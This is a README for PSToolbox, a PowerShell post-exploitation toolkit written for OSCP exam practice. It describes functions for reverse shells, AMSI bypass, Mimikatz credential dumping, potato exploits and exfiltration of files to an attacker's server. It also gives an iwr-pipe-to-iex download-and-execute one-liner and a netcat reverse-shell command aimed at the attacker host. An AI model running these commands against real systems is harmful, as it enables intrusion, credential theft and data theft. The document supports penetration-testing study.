# PSToolbox

PSToolbox is a collection of utilities designed for security operations, including network reconnaissance, reverse shell establishment, data exfiltration, and system analysis. This toolkit facilitates interactions with a custom python web server. It makes performing various other essential tasks in penetration testing and cybersecurity assessments easier once a foothold is established on a Windows machine. It was created as a part of my studies for the OSCP exam and are intended to make tasks during the exam easier.

Functions

    Set-PSToolBoxConfig: Configure global variables including the attacker's IP, web server port, protocol, and toolbox location on the victim machine. This will run automattically when the ps1 is run. In some shells the prompts are not shown but the inputs are still expected. if you set the global variables yourself before running the script you can skip this step.
    Show-PSToolboxConfig: Display the current configuration.
    Get-SingleToolboxItem: Download a single item from the toolbox. Take a location 
    Bypass-AMZEE: Load a script to bypass AMZEE. Select your method. 
    Load-Pview: Load the PowerView script into memory.
    Start-LigoloAgent: Start the Ligolo reverse tunnel agent. Uses default port unless specified.
    Start-SharpHound: Execute SharpHound for Active Directory enumeration.
    Start-Shell: Establish a reverse shell connection.
    Load-ScriptItemInMemory: Load a script item directly into memory. For functions in script files to be available to your pwsh session they must be instantiated as Global. ex. function Global:Func{}
    Start-AdEnum: Perform Active Directory enumeration with homegrown adenum.ps1.
    Start-Winpeas: Execute WinPEAS for privilege escalation.
    Start-Mimikatz: Execute Mimikatz for credential dumping.
    Get-potatos: Download potato exploits.
    Send-FilesHome: Exfiltrate files to the attacker's server.
    UploadStringToWebServer: Upload a string to the web server as a file.
    UploadToWebServer: Upload files to the web server.
    Get-ToolboxItems: Download multiple toolbox items based on a match string.
    
Getting Started:

These instructions will guide you through setting up and using the PSToolbox on your local machine for development and testing purposes.

Prerequisites:

    Git
    Python 3
    Access to a PowerShell environment (for the victim machine simulation)

Installation:
Begin by cloning the PSToolbox repository to your local machine:

    gh repo clone jeamajoal/PSToolbox

# Prepare the Loadables Directory:

Add any required files to the 'loadables' directory
Navigate to the cloned repository and ensure the loadables directory contains all necessary tools and scripts you intend to serve.

# Start the Web Server

Run the provided Python web server script, postserver.py, to serve the content of the loadables directory.

    python3 python/postserver.py -b 0.0.0.0 -p 8443 -u ~/uploads
*NOTE:  The uploads dir is being set OUTSIDE of the loadables folder.  This will make your Get-TollboxItems (gti) run more efficiently later if you so choose to use it. Otherwise if you are ok waiting you can keep it in your loadables folder. 

# Usage

To use the toolbox from a victim machine (simulated environment), run the following PowerShell command. This command utilizes Invoke-WebRequest (alias iwr) to source the GetToolbox.ps1 script from the web server:

powershell

	iwr http://<YourServerIP>:<Port>/GetToolbox.ps1 -UseBasic | iex

You will be prompted for your ip, web server port, is web server secure (https), and Local toolbox directory (defaults to c:\users\public). If the prompts do not echo in your shell they are still waiting for input in this order.  If you would rather set the global variables before running the script this portion will be sckipped.

	#Show the current config
	Show-PSToolboxConfig

	#Reset the config
	Set-PSToolboxConfig -Reset

	#Download all linked files that match linpeas	
	gti -m linpeas
	
	#Download a single toolbox item instead of doing a recursive search
	Get-SingleToolboxItem -item 'enum/adenumv2.ps1'

	#download single item and save with different name
	Get-SingleToolboxItem -item 'enum/adenumv2.ps1' -name 'ad.ps1'

	#Start a netcat reverse shell to the attacker host
	Start-Shell -Type NC -port 4444

This project is licensed under the MIT License - see the LICENSE.md file for details.
Acknowledgments


